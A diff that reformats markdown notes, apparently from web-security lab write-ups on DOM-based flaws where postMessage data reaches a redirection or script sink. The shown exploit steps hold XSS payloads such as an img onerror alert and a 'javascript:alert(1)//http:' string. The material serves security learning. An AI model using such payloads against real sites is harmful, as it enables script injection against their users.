@@ -63,7 +63,8 @@ This is vulnerable to DOM-based open redirection because the `location.hash` sou
    })
 
   ```
-   *Exploit:*
+  *Exploit:*
+  
     - Goto the source tab add breakpoint to document.getElement
     - Goto the console tab
     - window.postMessage('<img src=x onerror=alert(1)>','*')
@@ -90,7 +91,8 @@ This is vulnerable to DOM-based open redirection because the `location.hash` sou
    "http:" string and proceeds to send the payload to the location.href sink, where the print() function is called.
 
   **Exploit:** 
-    1- Goto the developer tool in source tab add breakpoint to the `url` var.    
+  
+    1- Goto the developer tool in source tab add breakpoint to the `url` var.   
     2- Then goto the console tab type 
         window.postMessage('javascript:alert(1)//http:','*')
     3- You can Iframe to exploit for poc
